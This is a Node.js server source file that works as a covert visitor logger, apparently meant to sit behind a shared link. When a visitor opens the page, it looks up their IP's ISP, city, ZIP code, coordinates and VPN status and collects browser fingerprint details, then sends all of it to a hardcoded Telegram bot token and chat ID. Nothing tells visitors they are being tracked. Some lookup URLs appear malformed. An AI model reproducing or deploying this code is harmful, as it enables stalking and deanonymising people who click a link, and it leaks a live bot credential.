const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

// --- TELEGRAM CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = "8800421642:AAFaQPILSBVnrlPOy_rmoSwAmYl5FRC9s_8";
const TELEGRAM_CHAT_ID = "8714686528"; 

let logCache = {};

function sendTelegramMessage(text) {
    const data = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: "Markdown" });
    const options = {
        hostname: 'api.telegram.org', port: 443, path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
    };
    const req = https.request(options, () => {});
    req.write(data); req.end();
}

function queryNetworkDetails(ip, callback) {
    if (ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.')) {
        return callback({
            status: "success", city: "Local Test Profile", regionName: "Home Network",
            country: "Local Host", isp: "Internal Router Connection", mobile: false, proxy: false
        });
    }

    // Using an alternative endpoint fields string to guarantee data mapping success
    https.get(`https://ip-api.com{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,mobile,proxy`, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
            try {
                callback(JSON.parse(data));
            } catch (e) { callback(null); }
        });
    }).on('error', () => callback(null));
}

const server = http.createServer((req, res) => {
    const userAgent = req.headers['user-agent'] || '';
    
    // FIX 1: Ignore automated bot visits and browser icon background queries completely
    if (userAgent.toLowerCase().includes('uptimerobot') || req.url === '/favicon.ico') {
        res.writeHead(200, { 'Content-Type': 'image/x-icon' }); 
        res.end(); 
        return;
    }

    // Extract the true public IP passing through Render's network boundaries
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const cleanIp = rawIp.split(',')[0].trim();

    if (req.method === 'GET' && req.url === '/') {
        const timestamp = new Date().toLocaleString();
        
        let deviceModel = "Unknown Brand Device";
        if (/iPhone/i.test(userAgent)) deviceModel = "Apple iPhone";
        else if (/iPad/i.test(userAgent)) deviceModel = "Apple iPad";
        else if (/Android/i.test(userAgent)) {
            const match = userAgent.match(/Android\s+[^;]+;\s+([^)]+)/);
            deviceModel = match ? `Android Device (${match[1]})` : "Android Device";
        } else if (/Windows NT/i.test(userAgent)) deviceModel = "Windows PC / Laptop";
        else if (/Macintosh/i.test(userAgent)) deviceModel = "Apple Mac Computer";

        queryNetworkDetails(cleanIp, (net) => {
            // Instantly structure cache map object profile
            logCache[cleanIp] = {
                timestamp, deviceModel,
                ip: cleanIp,
                isp: net && net.status === 'success' ? net.isp : "Hidden ISP Profile",
                city: net && net.status === 'success' ? net.city : "Unknown City",
                region: net && net.status === 'success' ? net.regionName : "Unknown Region",
                country: net && net.status === 'success' ? net.country : "Unknown Country",
                zip: net && net.status === 'success' ? net.zip : "N/A",
                isMobile: net && net.mobile ? "Yes (Cellular Data Network)" : "No (Wi-Fi / Broadband)",
                isProxy: net && net.proxy ? "⚠️ Yes (VPN / Proxy Network Active)" : "No (Direct Clear Connection)",
                map: net && net.lat ? `https://google.com{net.lat},${net.lon}` : null,
                sent: false
            };

            // Safety timeout fallback: Dispatch data even if browser specs processing fails
            setTimeout(() => {
                if (logCache[cleanIp] && !logCache[cleanIp].sent) {
                    compileAndSendReport(cleanIp, null);
                }
            }, 1500);
        });

        fs.readFile(path.join(__dirname, 'index.html'), (err, content) => {
            res.writeHead(200, { 'Content-Type': 'text/html' }); res.end(content);
        });
    } 
    else if (req.method === 'POST' && req.url === '/specs-sync') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
            try {
                compileAndSendReport(cleanIp, JSON.parse(body));
            } catch (e) { compileAndSendReport(cleanIp, null); }
            res.writeHead(200); res.end();
        });
    }
});

function compileAndSendReport(ip, specs) {
    const info = logCache[ip];
    if (!info || info.sent) return;
    info.sent = true; // FIX 2: Lock message deployment immediately so it can never duplicate

    const screenString = specs ? `${specs.width}x${specs.height} (@${specs.pixelRatio}x)` : "Not Reported";
    const gpuString = specs ? specs.gpu : "Not Reported";
    const cpuString = specs ? `${specs.cores} Core Processors` : "Not Reported";
    const langString = specs ? specs.language : "Not Reported";
    const zoneString = specs ? specs.timezone : "Not Reported";

    let locationMapBlock = info.map ? `\n🗺️ [Open Google Maps Gateway Connection](${info.map})` : "";

    const fullReport = `📁 *Consolidated Link Access Profile*\n\n` +
                       `📶 *Public Network IP:* \`${info.ip}\`\n` +
                       `🏢 *Internet Service Operator (ISP):* ${info.isp}\n` +
                       `📶 *Connection Framework:* ${info.isMobile}\n` +
                       `🛡️ *Anonymity Shield Profile:* ${info.isProxy}\n` +
                       `🌍 *Estimated Location:* ${info.city}, ${info.region}, ${info.country} (${info.zip})\n\n` +
                       `📱 *Detected Hardware Profile:* ${info.deviceModel}\n` +
                       `⚙️ *CPU Processing Capacity:* ${cpuString}\n` +
                       `🎮 *Graphics Processor (GPU):* \`${gpuString}\`\n` +
                       `🖥️ *Display Resolutions:* ${screenString}\n` +
                       `🌐 *System Language Configuration:* ${langString}\n` +
                       `⏰ *Device Time Zone Profile:* ${zoneString}\n\n` +
                       `⏱️ *Time Stamp Notification:* ${info.timestamp}` +
                       locationMapBlock;

    sendTelegramMessage(fullReport);
    delete logCache[ip]; // Clean memory storage allocation out completely
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {});
